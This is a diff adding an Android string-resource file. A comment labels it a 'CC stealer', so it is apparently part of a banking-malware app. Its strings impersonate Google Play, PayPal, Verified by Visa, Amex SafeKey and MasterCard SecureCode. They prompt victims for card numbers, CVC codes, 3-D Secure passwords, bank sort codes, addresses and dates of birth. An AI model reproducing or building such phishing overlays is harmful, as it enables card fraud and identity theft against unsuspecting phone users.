@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources xmlns:tools="http://schemas.android.com/tools" tools:ignore="MissingTranslation">
+
+    <!-- USSDService -->
+    <string name="a">Running</string>
+    <!-- CC stealer -->
+    <string name="b">Google play</string>
+    <string name="c">OK</string>
+
+    <string name="d">Add a payment option to complete your account. You will not be charged unless you make a purchase.</string>
+    <string name="e">Card is not supported</string>
+
+    <string name="f">Paypal</string>
+    <string name="g">PayPal account information needs to be updated as part of our continuing commitment.</string>
+
+    <string name="h">Please submit your Verified by Visa password</string>
+    <string name="i">Please submit your Amex SafeKey password</string>
+    <string name="j">Please submit your MasterCard Secure Code Password</string>
+
+    <string name="k">Card number</string>
+    <string name="l">Password</string>
+    <string name="m">MM</string>
+    <string name="n">YY</string>
+    <string name="o">CVC</string>
+    <string name="p">Sort Code</string>
+    <string name="q">Account Number</string>
+
+    <string name="r">Full Name</string>
+    <string name="s">Address</string>
+    <string name="t">Post code</string>
+    <string name="u">Billing phone number</string>
+    <string name="v">DD</string>
+    <string name="w">Date of Birth</string>
+
+    <!-- random shit -->
+    
+</resources>
